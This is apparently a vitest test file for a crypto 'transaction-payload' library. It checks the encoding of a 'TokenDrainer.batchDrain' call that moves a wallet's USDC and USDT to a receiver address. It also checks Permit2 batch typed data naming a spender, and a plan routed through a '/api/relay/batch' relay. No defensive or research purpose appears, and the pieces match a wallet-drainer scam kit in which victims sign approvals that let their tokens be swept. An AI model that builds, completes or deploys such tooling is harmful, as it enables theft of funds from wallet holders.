import { describe, it, expect } from "vitest";
import { encodeContractCall, buildTransactionPlan, buildPermit2TypedData, PERMIT2_ADDRESS } from "@/lib/transaction-payload";

const WALLET = "0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18";
const RECEIVER = "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693";
const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";

describe("transaction-payload", () => {
  it("encodes TokenDrainer.batchDrain calldata", () => {
    const tx = encodeContractCall({
      contractId: "token-drainer",
      functionName: "batchDrain",
      wallet: WALLET,
      receiver: RECEIVER,
      tokens: [
        { token: USDC, amount: "1000000" },
        { token: USDT, amount: "2000000" },
      ],
    });
    expect(tx.to.toLowerCase()).toBe("0x2f9eef35e82c44441f756b064fdda0200f444ca4");
    expect(tx.functionName).toBe("batchDrain");
    expect(tx.data.startsWith("0x")).toBe(true);
    expect(tx.data.length).toBeGreaterThan(10);
    expect(tx.data.toLowerCase()).toContain(WALLET.slice(2).toLowerCase());
    expect(tx.data.toLowerCase()).toContain(USDC.slice(2).toLowerCase());
  });

  it("builds Permit2 typed data with spender + token amounts", () => {
    const td = buildPermit2TypedData({
      chainId: 1,
      spender: "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A",
      tokens: [{ token: USDC, amount: "1000000", nonce: 3 }],
      expiration: 2_000_000_000,
      sigDeadline: 1_900_000_000,
    });
    expect(td.domain.verifyingContract).toBe(PERMIT2_ADDRESS);
    expect(td.primaryType).toBe("PermitBatch");
    expect(td.message.details[0].token).toBe(USDC);
    expect(td.message.details[0].amount).toBe("1000000");
    expect(td.message.details[0].nonce).toBe(3);
    expect(td.message.sigDeadline).toBe("1900000000");
  });

  it("returns a full plan with txs + permit2TypedData", () => {
    const plan = buildTransactionPlan({
      wallet: WALLET,
      receiver: RECEIVER,
      chainId: 1,
      contractId: "token-drainer",
      tokens: [{ token: USDC, amount: "5000000", symbol: "USDC", decimals: 6 }],
    });
    expect(plan.wallet.toLowerCase()).toBe(WALLET.toLowerCase());
    expect(plan.receiver.toLowerCase()).toBe(RECEIVER.toLowerCase());
    expect(plan.txs.length).toBeGreaterThan(0);
    expect(plan.txs[0].data.startsWith("0x")).toBe(true);
    expect(plan.permit2TypedData.message.details[0].token).toBe(USDC);
    expect(plan.relayUrl).toContain("/api/relay/batch");
  });
});
